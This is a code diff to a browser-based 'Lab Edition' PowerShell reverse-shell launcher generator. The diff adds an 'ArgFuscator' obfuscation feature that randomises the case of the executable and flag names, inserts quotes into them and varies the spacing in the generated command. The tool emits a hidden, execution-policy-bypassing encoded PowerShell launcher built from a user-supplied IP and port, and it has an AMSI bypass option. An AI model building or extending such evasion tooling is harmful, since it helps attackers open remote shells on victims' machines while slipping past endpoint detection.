@@ -190,6 +190,18 @@
             font-weight: 600;
             color: #94a3b8;
         }
+        .output-header .badge {
+            background: #1a2a44;
+            padding: 2px 10px;
+            border-radius: 9999px;
+            font-size: 0.7rem;
+            color: #f472b6;
+            border: 1px solid #4a1a3a;
+            display: none;
+        }
+        .output-header .badge.active {
+            display: inline-block;
+        }
         footer {
             text-align: center;
             padding: 20px;
@@ -259,8 +271,8 @@
             <div class="subtitle">Lab Edition - Authorized Testing Only</div>
         </div>
         <div style="margin-left: auto; display: flex; gap: 8px; flex-wrap: wrap;">
-            <span class="tag">v2.5 Lab</span>
-            <span class="tag">Fixed Output</span>
+            <span class="tag">v2.8 Lab</span>
+            <span class="tag">ArgFuscator Fixed</span>
         </div>
     </div>
     <div class="input-area">
@@ -295,6 +307,7 @@
             <label><input type="checkbox" id="b64Mode" checked> Base64 Launcher</label>
             <label><input type="checkbox" id="utf16Mode" checked> UTF-16LE</label>
             <label><input type="checkbox" id="amsiBypass"> AMSI Placeholder</label>
+            <label><input type="checkbox" id="argFuscator"> ArgFuscator</label>
         </div>
 
         <div class="btn-group">
@@ -306,7 +319,10 @@
     </div>
 
     <div style="padding:0 32px 20px;">
-        <div class="output-header"><span>Generated Launcher</span></div>
+        <div class="output-header">
+            <span>Generated Launcher</span>
+            <span class="badge" id="argBadge">ArgFuscated</span>
+        </div>
         <div id="obfuscatedOutput" class="output-box">
             <span style="color:#4a5a7a;">Click Generate...</span>
         </div>
@@ -385,6 +401,98 @@ function toUtf16LEBase64(str) {
     return btoa(utf16);
 }
 
+function argFuscate(cmd) {
+    // Split into parts: executable and arguments
+    let parts = cmd.split(' ');
+    if (parts.length === 0) return cmd;
+    
+    // Obfuscate the executable name (powershell) - ONLY the executable, not the encoded data
+    let exe = parts[0];
+    let obfExe = '';
+    for (let i = 0; i < exe.length; i++) {
+        if (Math.random() > 0.5) {
+            obfExe += exe[i].toUpperCase();
+        } else {
+            obfExe += exe[i].toLowerCase();
+        }
+    }
+    // Add quotes around a single character in the executable
+    if (Math.random() > 0.5 && exe.length > 3) {
+        let pos = Math.floor(Math.random() * (exe.length - 2)) + 1;
+        obfExe = obfExe.slice(0, pos) + '"' + obfExe[pos] + '"' + obfExe.slice(pos + 1);
+    }
+    parts[0] = obfExe;
+    
+    // Obfuscate ONLY the parameter names, NOT the values
+    // The encoded data is the last part and must remain untouched
+    let encodedData = '';
+    let paramParts = [];
+    
+    // Find the encoded data (last part that looks like base64)
+    for (let i = parts.length - 1; i >= 0; i--) {
+        if (parts[i].match(/^[A-Za-z0-9+\/=]+$/)) {
+            encodedData = parts[i];
+            break;
+        }
+    }
+    
+    // If we found encoded data, remove it from parts and process the rest
+    if (encodedData) {
+        let index = parts.indexOf(encodedData);
+        // Process arguments before the encoded data
+        for (let i = 1; i < index; i++) {
+            let arg = parts[i];
+            // Only obfuscate if it starts with - (it's a parameter)
+            if (arg.startsWith('-')) {
+                let obfArg = '';
+                for (let j = 0; j < arg.length; j++) {
+                    if (Math.random() > 0.5) {
+                        obfArg += arg[j].toUpperCase();
+                    } else {
+                        obfArg += arg[j].toLowerCase();
+                    }
+                }
+                // Insert quotes in parameter name (but keep the dash)
+                if (Math.random() > 0.5 && obfArg.length > 3) {
+                    let pos = Math.floor(Math.random() * (obfArg.length - 2)) + 1;
+                    if (obfArg[pos - 1] !== '-') {
+                        obfArg = obfArg.slice(0, pos) + '"' + obfArg[pos] + '"' + obfArg.slice(pos + 1);
+                    }
+                }
+                parts[i] = obfArg;
+            }
+        }
+        // Keep the encoded data as-is
+        parts[index] = encodedData;
+    } else {
+        // No encoded data found, obfuscate all args
+        for (let i = 1; i < parts.length; i++) {
+            let arg = parts[i];
+            if (arg.startsWith('-')) {
+                let obfArg = '';
+                for (let j = 0; j < arg.length; j++) {
+                    if (Math.random() > 0.5) {
+                        obfArg += arg[j].toUpperCase();
+                    } else {
+                        obfArg += arg[j].toLowerCase();
+                    }
+                }
+                parts[i] = obfArg;
+            }
+        }
+    }
+    
+    // Rebuild the command with random spacing (but keep at least one space)
+    let result = parts[0];
+    for (let i = 1; i < parts.length; i++) {
+        if (parts[i]) {
+            result += (Math.random() > 0.7 ? '  ' : ' ') + parts[i];
+        }
+    }
+    
+    return result;
+}
+
 function handleGenerate() {
     const ip = document.getElementById('ip').value.trim();
     const port = document.getElementById('port').value.trim();
@@ -392,6 +500,15 @@ function handleGenerate() {
     const useB64 = document.getElementById('b64Mode').checked;
     const useUtf16 = document.getElementById('utf16Mode').checked;
     const useAmsi = document.getElementById('amsiBypass').checked;
+    const useArgFuscator = document.getElementById('argFuscator').checked;
+
+    // Update the ArgFuscator badge
+    const badge = document.getElementById('argBadge');
+    if (useArgFuscator) {
+        badge.classList.add('active');
+    } else {
+        badge.classList.remove('active');
+    }
 
     if (!ip || !port || isNaN(parseInt(port))) {
         alert('Please enter valid IP and Port');
@@ -411,10 +528,21 @@ function handleGenerate() {
         } else {
             encoded = btoa(payload);
         }
-        display = `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${encoded}`;
+        let baseCmd = `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${encoded}`;
+        
+        if (useArgFuscator) {
+            display = argFuscate(baseCmd);
+        } else {
+            display = baseCmd;
+        }
         currentLauncher = display;
     } else {
-        currentLauncher = payload;
+        if (useArgFuscator) {
+            display = argFuscate(payload);
+        } else {
+            display = payload;
+        }
+        currentLauncher = display;
     }
 
     document.getElementById('obfuscatedOutput').textContent = display;
@@ -462,6 +590,7 @@ document.getElementById('clearBtn').addEventListener('click', function() {
     document.getElementById('decodedOutput').textContent = 'Readable version appears here...';
     document.getElementById('copyObfuscatedBtn').disabled = true;
     document.getElementById('copyReadableBtn').disabled = true;
+    document.getElementById('argBadge').classList.remove('active');
     currentReadable = '';
     currentLauncher = '';
 });
@@ -471,6 +600,16 @@ document.getElementById('ip').addEventListener('keypress', function(e) {
 });
 document.getElementById('port').addEventListener('keypress', function(e) {
     if (e.key === 'Enter') handleGenerate();
+});
+
+// Toggle ArgFuscator badge visibility when checkbox changes
+document.getElementById('argFuscator').addEventListener('change', function() {
+    const badge = document.getElementById('argBadge');
+    if (this.checked) {
+        badge.classList.add('active');
+    } else {
+        badge.classList.remove('active');
+    }
 });
 
 document.addEventListener('DOMContentLoaded', function() {
